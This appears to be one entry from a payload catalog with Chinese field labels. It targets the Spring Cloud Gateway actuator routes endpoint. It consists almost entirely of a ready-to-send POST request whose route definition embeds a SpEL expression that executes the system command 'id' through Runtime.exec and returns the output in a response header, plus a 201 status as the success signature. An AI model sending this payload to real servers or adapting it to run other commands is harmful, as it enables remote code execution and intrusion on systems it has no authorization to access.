# Spring

Spring ｜ 其他 ｜ —
- **请求**：`POST /actuator/gateway/routes/8Fn3ivs HTTP/1.1`

**Payload**
```
{"id": "8Fn3ivs", "filters": [{"name": "AddResponseHeader", "args": {"name": "Result", "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"}}], "uri": "http://example.com"}
```
- **响应特征**：201